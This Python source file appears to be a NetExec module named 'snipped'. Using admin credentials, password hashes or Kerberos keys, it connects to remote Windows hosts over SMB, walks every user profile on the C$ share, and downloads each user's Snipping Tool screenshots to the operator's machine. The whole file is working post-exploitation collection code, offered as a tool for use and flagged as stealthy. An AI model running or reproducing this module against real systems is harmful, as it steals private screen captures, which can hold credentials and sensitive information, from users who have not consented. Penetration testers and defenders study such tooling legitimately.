from impacket import smb, smb3
import ntpath
from os import makedirs
from os.path import join, exists
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target

class NXCModule:

    name = "snipped"
    description = "Downloads screenshots taken by the (new) Snipping Tool."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """
        USERS           Download only specified user(s); format: -o USERS=user1,user2,user3
        """
        self.context = context
        self.screenshot_path_stub = r"Pictures\Screenshots"
        self.users = module_options["USERS"].split(",") if "USERS" in module_options else None

    def on_admin_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.share = "C$"
        
        host = f"{connection.hostname}.{connection.domain}"
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        dploot_conn = self.upgrade_connection(target=target, connection=connection.conn)

        output_path = f"nxc_snipped_{connection.host}"
        context.log.debug("Getting all user folders")
        try:
            user_folders = dploot_conn.listPath(self.share, "\\Users\\*")
        except Exception as e:
            context.log.fail(f"Failed to list user folders: {e}")
            return

        context.log.debug(f"User folders: {user_folders}")
        if not user_folders:
            context.log.fail("No User folders found!")
            return
        else:
            context.log.display("Attempting to download screenshots if existent.")

        for user_folder in user_folders:
            if not user_folder.is_directory():
                continue
            folder_name = user_folder.get_longname()
            if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                continue
            if self.users and folder_name not in self.users:
                continue

            screenshot_path = ntpath.normpath(join(r"Users", folder_name, self.screenshot_path_stub))
            try:
                screenshot_files = dploot_conn.listPath(self.share, screenshot_path + "\\*")
            except Exception as e:
                context.log.debug(f"Screenshot folder {screenshot_path} not found for user {folder_name}: {e}")
                continue

            if not screenshot_files:
                context.log.debug(f"No screenshots found in {screenshot_path} for user {folder_name}")
                continue

            user_output_dir = join(output_path, folder_name)
            if not exists(user_output_dir):
                makedirs(user_output_dir)

            context.log.display(f"Downloading screenshots for user {folder_name}")
            downloaded_count = 0
            for file in screenshot_files:
                if file.is_directory():
                    continue
                remote_file_path = ntpath.join(screenshot_path, file.get_longname())
                local_file_path = join(user_output_dir, file.get_longname())
                with open(local_file_path, 'wb') as local_file:
                    try:
                        context.log.debug(f"Downloading {remote_file_path} to {local_file_path}")
                        dploot_conn.readFile(self.share, remote_file_path, local_file.write)
                        downloaded_count += 1
                    except Exception as e:
                        context.log.debug(f"Failed to download {remote_file_path} for user {folder_name}: {e}")
                        continue

            context.log.success(f"{downloaded_count} screenshots for user {folder_name} downloaded to {user_output_dir}")

    def upgrade_connection(self, target: Target, connection=None):
        conn = DPLootSMBConnection(target)
        if connection is not None:
            conn.smb_session = connection
        else:
            conn.connect()
        return conn
